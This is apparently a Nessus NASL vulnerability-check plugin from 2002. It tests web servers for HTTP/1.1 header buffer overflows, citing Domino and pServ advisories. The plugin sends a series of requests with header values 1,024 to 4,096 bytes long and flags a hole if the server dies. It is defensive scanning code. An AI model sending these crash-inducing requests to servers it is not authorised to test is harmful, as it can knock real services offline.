#
# This script was written by Michel Arboi <arboi@alussinan.org>
# GPL
# *untested*
#
# I don't even know if it crashes any web server...
# 
# Cf. RFC 2068
#
# Vulnerable servers (not tested)
#
# Domino < 6.0.1
# From: "NGSSoftware Insight Security Research" <nisr@nextgenss.com>
# Subject: Lotus Domino Web Server Host/Location Buffer Overflow Vulnerability (#NISR17022003a)
# To: <bugtraq@securityfocus.com>, <vulnwatch@vulnwatch.org>,
#    <ntbugtraq@listserv.ntbugtraq.com>
# Date: Mon, 17 Feb 2003 16:19:20 -0800
#
# From: "Matthew Murphy" <mattmurphy@kc.rr.com>
# Subject: Multiple pServ Remote Buffer Overflow Vulnerabilities
# To: "BugTraq" <bugtraq@securityfocus.com>
# Date: Sun, 1 Dec 2002 12:15:52 -0600
#


if(description)
{
 script_id(11129);
 script_bugtraq_id(6951);
 script_version ("$Revision: 1.14 $");
 name["english"] = "HTTP 1.1 header overflow";
 script_name(english:name["english"]);
 
 desc["english"] = "It was possible to kill the web server by
sending an invalid request with a too long HTTP 1.1 header
(Accept-Encoding, Accept-Language, Accept-Range, Connection, 
Expect, If-Match, If-None-Match, If-Range, If-Unmodified-Since,
Max-Forwards, TE, Host)

A cracker may exploit this vulnerability to make your web server
crash continually or even execute arbirtray code on your system.

Solution : upgrade your software or protect it with a filtering reverse proxy
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Too long HTTP 1.1 header kills the web server";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
# All the www_too_long_*.nasl scripts were first declared as 
# ACT_DESTRUCTIVE_ATTACK, but many web servers are vulnerable to them:
# The web server might be killed by those generic tests before Nessus 
# has a chance to perform known attacks for which a patch exists
# As ACT_DENIAL are performed one at a time (not in parallel), this reduces
# the risk of false positives.
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports("Services/www", 80);
 script_dependencie("find_service.nes", "httpver.nasl", "http_version.nasl");
 exit(0);
}

########

include("http_func.inc");


port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);
if (http_is_dead(port: port)) exit(0);

soc = http_open_socket(port);
if(! soc) exit(0);

r = string("GET / HTTP/1.1\r\nHost: ", crap(1024), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket: soc);
http_close_socket(soc);

#
soc = http_open_socket(port);
if (! soc)  { security_hole(port); exit(0); }
#
#
r1 = string("GET / HTTP/1.1\r\nHost: ", get_host_name(), "\r\n");
#
r = string(r1, "Accept-Encoding: ", crap(4096), "compress, *\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket: soc);
http_close_socket(soc);

#
soc = http_open_socket(port);
if (! soc)  { security_hole(port); exit(0); }

r = string(r1, "Accept-Language: en, ", crap(4096), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket: soc);
http_close_socket(soc);

#
soc = http_open_socket(port);
if (! soc)  { security_hole(port); exit(0); }

r = string(r1, "Accept-Range: ",crap(data: "bytes", length: 4096), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket: soc);
http_close_socket(soc);

#
soc = http_open_socket(port);
if (! soc)  { security_hole(port); exit(0); }

r = string(r1, "Connection: ", crap(data: "close", length: 4096), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket: soc);
http_close_socket(soc);

#
soc = http_open_socket(port);
if (! soc)  { security_hole(port); exit(0); }

r = string(r1, "Expect: ", crap(4096), "=",crap(4096), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket: soc);
http_close_socket(soc);

#
soc = http_open_socket(port);
if (! soc)  { security_hole(port); exit(0); }

r = string(r1, "If-Match: ", crap(4096), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket: soc);
http_close_socket(soc);

#
soc = http_open_socket(port);
if (! soc)  {  security_hole(port); exit(0); }

r = string(r1, "If-None-Match: ", crap(4096), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket: soc);
http_close_socket(soc);

#
soc = http_open_socket(port);
if (! soc)  { security_hole(port); exit(0); }

r = string(r1, "If-Range: ", crap(4096), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket: soc);
http_close_socket(soc);

#
soc = http_open_socket(port);
if (! soc)  { security_hole(port); exit(0); }

r = string(r1, "If-Unmodified-Since: Sat, 29 Oct 1994 19:43:31 ", 
	crap(data: "GMT", length: 1024), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket: soc);
http_close_socket(soc);

#
soc = http_open_socket(port);
if (! soc)  { security_hole(port); exit(0); }

r = string(r1, "Max-Forwards: ", crap(data: "6", length: 4096), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket: soc);
http_close_socket(soc);

#
soc = http_open_socket(port);
if (! soc)  { security_hole(port); exit(0); }

r = string(r1, "TE: deflate, ", crap(4096), "\r\n\r\n");

send(socket:soc, data: r);
r = http_recv(socket: soc);
http_close_socket(soc);

#
if (http_is_dead(port: port)) { security_hole(port); exit(0); }
